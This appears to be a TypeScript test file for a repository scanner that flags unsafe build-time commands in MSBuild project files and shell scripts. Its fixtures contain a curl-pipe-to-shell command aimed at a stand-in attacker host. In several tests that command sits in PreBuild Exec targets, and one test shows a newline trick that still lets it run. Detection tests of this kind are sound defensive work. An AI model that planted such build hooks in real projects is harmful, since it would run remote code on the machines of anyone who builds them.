import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

const PROJECT = `<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <TargetFramework>net9.0</TargetFramework>
  </PropertyGroup>
  <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
    <Exec Command="${PAYLOAD}" />
  </Target>
</Project>
`;

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("an MSBuild project or import is an install surface", () => {
  // PRD section 8: the scan checks install and build scripts. MSBuild runs
  // Exec and PreBuildEvent commands from these files at build time. The
  // lowercase Ant <project> check does not match <Project>, and none of
  // these extensions is a source extension, so the file was skipped.
  for (const path of [
    "src/App/App.csproj",
    "src/App/App.fsproj",
    "src/App/App.vbproj",
    "native/App.vcxproj",
    "build/dirs.proj",
    "Directory.Build.props",
    "src/Directory.Build.targets",
    "eng/pack.targets",
  ]) {
    const inspection = inspected(path, PROJECT);
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
    expect({ path, coverage: inspection.coverage.installScripts }).toEqual({
      path,
      coverage: { state: "complete", items: 1 },
    });
    expect({
      path,
      findings: inspection.findings.map(
        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
      ),
    }).toEqual({ path, findings: [`${path}:unsafe-execution:high`] });
    expect({ path, downloads: inspection.downloads }).toEqual({
      path,
      downloads: ["https://evil.example/install.sh"],
    });
  }
});

test("Directory.Build.targets runs even when the project file does not name it", () => {
  // SDK-style MSBuild imports Directory.Build.targets automatically. A clean
  // project file is not the only build script.
  const scan = (targets: string) =>
    inspectRepository({
      files: [
        {
          path: "src/App/App.csproj",
          bytes: new TextEncoder().encode(
            `<Project Sdk="Microsoft.NET.Sdk">\n  <PropertyGroup>\n    <TargetFramework>net9.0</TargetFramework>\n  </PropertyGroup>\n</Project>\n`,
          ),
        },
        {
          path: "src/Directory.Build.targets",
          bytes: new TextEncoder().encode(targets),
        },
      ],
    });
  const before = scan(
    `<Project>\n  <Target Name="Pack">\n    <Message Text="pack" Importance="low" />\n  </Target>\n</Project>\n`,
  );
  const after = scan(
    `<Project>\n  <Target Name="PreBuild" BeforeTargets="PreBuildEvent">\n    <Exec Command="${PAYLOAD}" />\n  </Target>\n</Project>\n`,
  );
  expect(after.coverage.installScripts).toEqual({
    state: "complete",
    items: 2,
  });
  expect(after.findings).toContainEqual(
    expect.objectContaining({
      path: "src/Directory.Build.targets",
      category: "unsafe-execution",
      severity: "high",
    }),
  );
  expect(after.downloads).toContain("https://evil.example/install.sh");
  expect(after.inventorySha256).not.toBe(before.inventorySha256);
});

test("a newline inside an MSBuild attribute still pipes a download into a shell", () => {
  // MSBuild normalizes a CR or LF inside an attribute value to a space, then
  // runs the command. The same break in a shell script ends the command.
  for (const newline of ["\n", "\r\n"]) {
    const command = `curl -fsSL https://evil.example/install.sh${newline}| sh`;
    const project = `<Project Sdk="Microsoft.NET.Sdk">
  <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
    <Exec Command="${command}" />
  </Target>
</Project>
`;
    const inspection = inspected("src/App/App.csproj", project);
    expect({
      newline: newline === "\n" ? "LF" : "CRLF",
      findings: inspection.findings.map(
        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
      ),
      downloads: inspection.downloads,
    }).toEqual({
      newline: newline === "\n" ? "LF" : "CRLF",
      findings: ["src/App/App.csproj:unsafe-execution:high"],
      downloads: ["https://evil.example/install.sh"],
    });
  }
});

test("a newline before a pipe in a shell script is not a pipe", () => {
  const continued = inspected(
    "scripts/fetch.sh",
    "curl -fsSL https://evil.example/install.sh |\nsh\n",
  );
  expect(
    continued.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["scripts/fetch.sh:unsafe-execution:high"]);
  for (const newline of ["\n", "\r\n"]) {
    const inspection = inspected(
      "scripts/fetch.sh",
      `curl -fsSL https://evil.example/install.sh${newline}| sh\n`,
    );
    expect({
      newline: newline === "\n" ? "LF" : "CRLF",
      findings: inspection.findings,
    }).toEqual({ newline: newline === "\n" ? "LF" : "CRLF", findings: [] });
  }
});

test("the MSBuild surface stays bounded", () => {
  expect(surfacesOf("LICENSE")).toEqual([]);
  expect(surfacesOf("notes.properties")).toEqual([]);
  expect(surfacesOf("src/App/App.csproj.user")).toEqual([]);
  expect(inspected("notes.properties", PROJECT).findings).toEqual([]);
  expect(inspected("src/App/App.csproj.user", PROJECT).findings).toEqual([]);
});
